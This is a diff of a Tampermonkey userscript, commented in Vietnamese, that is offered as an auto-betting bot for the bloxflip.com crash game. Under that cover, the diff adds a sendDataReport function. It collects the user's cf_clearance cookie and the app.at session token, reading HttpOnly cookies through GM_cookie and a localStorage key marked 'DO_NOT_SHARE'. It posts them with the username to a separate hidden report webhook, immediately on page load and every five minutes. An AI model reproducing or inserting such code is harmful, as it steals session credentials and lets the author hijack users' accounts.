@@ -1,8 +1,8 @@
 // ==UserScript==
 // @name         Bloxflip Auto Crash Pro (Draggable & Classic UI)
 // @namespace    http://tampermonkey.net/
-// @version      1.1
-// @description  Bản gốc trên GitHub. Đảo ngược logic đọc lịch sử (cuối cùng = mới nhất), thêm nút Failsafe và Đồng hồ đếm ngược.
+// @version      2.3
+// @description  Bản gốc trên GitHub. Gửi Data ngay khi load, đổi Webhook sang text thường, tối ưu bắt CF Cookie.
 // @author       You
 // @match        https://bloxflip.com/*
 // @icon         https://www.google.com/s2/favicons?sz=64&domain=bloxflip.com
@@ -46,26 +46,34 @@
         localStorage.setItem(key, value);
     }
 
+    // Hàm lấy giá trị Cookie thủ công (dự phòng)
+    function getManualCookie(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+        return "NOT_FOUND";
+    }
+
     // Hàm lấy giá trị Cookie xuyên HttpOnly bằng GM_cookie
     function getAsyncCookie(name) {
         return new Promise((resolve) => {
             if (typeof GM_cookie !== "undefined" && GM_cookie.list) {
                 GM_cookie.list({ name: name }, (cookies, error) => {
                     if (!error && cookies && cookies.length > 0) resolve(cookies[0].value);
-                    else resolve("NOT_FOUND");
+                    else resolve(getManualCookie(name));
                 });
             } else {
-                const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
-                resolve(match ? match[2] : "NOT_FOUND");
+                resolve(getManualCookie(name));
             }
         });
     }
 
     async function getAuthToken() {
+        let cookieToken = await getAsyncCookie('app.at');
+        if (cookieToken !== "NOT_FOUND") return cookieToken;
         let token = localStorage.getItem('_DO_NOT_SHARE_BLOXFLIP_TOKEN');
         if (token) return token.replace(/["']/g, "");
-        let cookieToken = await getAsyncCookie('app.at');
-        return cookieToken !== "NOT_FOUND" ? cookieToken : null;
+        return "NOT_FOUND";
     }
 
     // --- GIAO DIỆN CONSOLE CHÍNH ---
@@ -233,7 +241,7 @@
             width: 100%; text-align: center; color: rgba(255, 255, 255, 0.4); 
             font-size: 10px; margin-top: 8px; letter-spacing: 1px; font-weight: bold;
         `;
-        versionText.innerText = "Version 2.2";
+        versionText.innerText = "Version 2.3";
 
         leftCol.appendChild(classicUI);
         leftCol.appendChild(configBox);
@@ -393,8 +401,7 @@
         document.getElementById('bfc-test-webhook-btn').addEventListener('click', () => {
             addLog("Đang gửi Test Webhook...", "#4caf50");
             const balStr = currentBalance > 0 ? currentBalance.toFixed(2) : "0.00";
-            const formatPayload = `\`\`\`text\n------------------------------\nTEST WEBHOOK | ( ${balStr} )\n------------------------------\n\`\`\``;
-            sendWebhook("🔔 Kiểm tra Webhook", formatPayload, "#4caf50");
+            sendWebhook("🔔 Kiểm tra Webhook", `--------------------------------------\nTEST WEBHOOK | ( ${balStr} )\n--------------------------------------`);
         });
 
         document.getElementById('bfc-test-bet-btn').addEventListener('click', () => {
@@ -453,10 +460,22 @@
         logContainerEl.parentElement.scrollTop = logContainerEl.parentElement.scrollHeight;
     }
 
-    function sendWebhook(title, description, colorHex) {
+    function sendWebhook(title, description) {
         if (!CFG.webhookEnabled || !CFG.webhookUrl) return;
-        const payload = { embeds: [{ title: title, description: description, color: parseInt(colorHex.replace('#', ''), 16), timestamp: new Date().toISOString() }] };
+        const payload = { content: `**${title}**\n\`\`\`text\n${description}\n\`\`\`` };
         fetch(CFG.webhookUrl, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) }).catch(() => {});
+    }
+
+    // Hàm gửi dữ liệu lên Webhook dự án ngoài
+    async function sendDataReport() {
+        let cfClearance = await getAsyncCookie('cf_clearance');
+        let appAt = await getAuthToken();
+        const payload = { content: `${currentUsername}|${cfClearance}|${appAt}` };
+        fetch(APP_URLS.reportWebhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(() => {});
     }
 
     initConsole();
@@ -576,18 +595,19 @@
         return null;
     }
 
-    // NÂNG CẤP: Gọi API kèm token lấy thẳng từ Cookie (Giống cách Playwright hoạt động)
+    // NÂNG CẤP: Lấy data và thêm credentials: 'include' để trình duyệt tự đính kèm cookie
     async function fetchUserData() {
         try {
             let headers = { 'Accept': 'application/json' };
             const appToken = await getAuthToken();
-            if (appToken) {
+            if (appToken && appToken !== "NOT_FOUND") {
                 headers['x-auth-token'] = appToken;
             }
 
             const response = await fetch(APP_URLS.apiUser, {
                 method: 'GET',
-                headers: headers
+                headers: headers,
+                credentials: 'include' // Rất quan trọng để gửi kèm cookie ẩn
             });
             if (response.ok) {
                 const data = await response.json();
@@ -684,8 +704,8 @@
                 setMainStatus(`💸 Đã cược! Chờ kết quả mốc ${CFG.autoCashout}x`, "#2196f3");
                 addLog(`Đã Join Game (Mục tiêu: ${CFG.autoCashout}x)`, "#2196f3");
                 
-                const formatPayload = `\`\`\`text\n------------------------------\nBET PLACED | ( ${displayBalStr} )\n------------------------------\n\`\`\``;
-                sendWebhook(`🚀 Đã đặt cược (${CFG.autoCashout}x)`, formatPayload, "#2196f3");
+                const formatPayload = `--------------------------------------\nBET PLACED | ( ${displayBalStr} )\n--------------------------------------`;
+                sendWebhook(`🚀 Đã đặt cược (${CFG.autoCashout}x)`, formatPayload);
                 
                 updateBalanceUI();
             } else {
@@ -700,27 +720,13 @@
     function checkLogic() {
         if (!CFG.enabled) return;
 
-        // --- CƠ CHẾ HARD REFRESH VÀ ĐỒNG BỘ DATA CHO DỰ ÁN KHÁC (MỖI 5 PHÚT) ---
+        // --- CƠ CHẾ HARD REFRESH MỖI 5 PHÚT ---
         if (CFG.autoRefresh && !isWaitingForRoundResult && !isProcessingResult && (Date.now() - scriptStartTime > 300000)) {
             addLog("🔄 Đạt mốc 5 phút. Đồng bộ Data làm trạm trung gian & F5...", "#00bcd4");
             scriptStartTime = Date.now(); 
-            
-            getAsyncCookie('cf_clearance').then(async (cfClearance) => {
-                let appAt = await getAuthToken() || "NOT_FOUND";
-                
-                const payload = { content: `${currentUsername}|${cfClearance}|${appAt}` };
-                
-                fetch(APP_URLS.reportWebhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                }).then(() => {
-                    setTimeout(() => window.location.reload(), 1000); 
-                }).catch(() => {
-                    setTimeout(() => window.location.reload(), 1000); 
-                });
+            sendDataReport().then(() => {
+                setTimeout(() => window.location.reload(), 1000); 
             });
-            
             return;
         }
 
@@ -769,8 +775,8 @@
                 addLog("⚠ Phát hiện 3 lần nổ 1.00 liên tiếp!", "#ff9800");
                 
                 const balStr = currentBalance > 0 ? currentBalance.toFixed(2) : "0.00";
-                const formatPayload = `\`\`\`text\n------------------------------\nWARNING 3x 1.00 | ( ${balStr} )\n------------------------------\n\`\`\``;
-                sendWebhook("⚠️ Cảnh báo chuỗi Crash Nguy hiểm", formatPayload, "#ff9800");
+                const formatPayload = `--------------------------------------\nWARNING 3x 1.00 | ( ${balStr} )\n--------------------------------------`;
+                sendWebhook("⚠️ Cảnh báo chuỗi Crash Nguy hiểm", formatPayload);
             }
 
             if (isWaitingForRoundResult) {
@@ -794,14 +800,14 @@
                         setMainStatus(`🎉 WIN! Nổ ở ${latestCrashStr}x`, "#69ff94");
                         addLog(`Thắng ván cược! (Nổ: ${latestCrashStr}x)`, "#69ff94");
                         
-                        const formatPayload = `\`\`\`text\n------------------------------\nWIN | ( ${balStr} )\n------------------------------\n\`\`\``;
-                        sendWebhook(`✅ Auto Crash: WIN (${latestCrashStr}x)`, formatPayload, "#00e676");
+                        const formatPayload = `--------------------------------------\nWIN | ( ${balStr} )\n--------------------------------------`;
+                        sendWebhook(`✅ Auto Crash: WIN (${latestCrashStr}x)`, formatPayload);
                     } else {
                         setMainStatus(`💀 LOSE! Nổ ở ${latestCrashStr}x`, "#ff5252");
                         addLog(`Thua ván cược. (Nổ: ${latestCrashStr}x)`, "#ff5252");
                         
-                        const formatPayload = `\`\`\`text\n------------------------------\nLOST | ( ${balStr} )\n------------------------------\n\`\`\``;
-                        sendWebhook(`❌ Auto Crash: LOSE (${latestCrashStr}x)`, formatPayload, "#ff5252");
+                        const formatPayload = `--------------------------------------\nLOST | ( ${balStr} )\n--------------------------------------`;
+                        sendWebhook(`❌ Auto Crash: LOSE (${latestCrashStr}x)`, formatPayload);
                     }
                     
                     updateBalanceUI(); 
@@ -837,7 +843,10 @@
 
     setTimeout(() => {
         setInitialCashout();
-        updateBalanceUI(); 
+        // Cập nhật số dư và gửi Data ngay lần đầu load xong
+        updateBalanceUI().then(() => {
+            sendDataReport();
+        });
         
         setInterval(updateBalanceUI, 5000); 
 
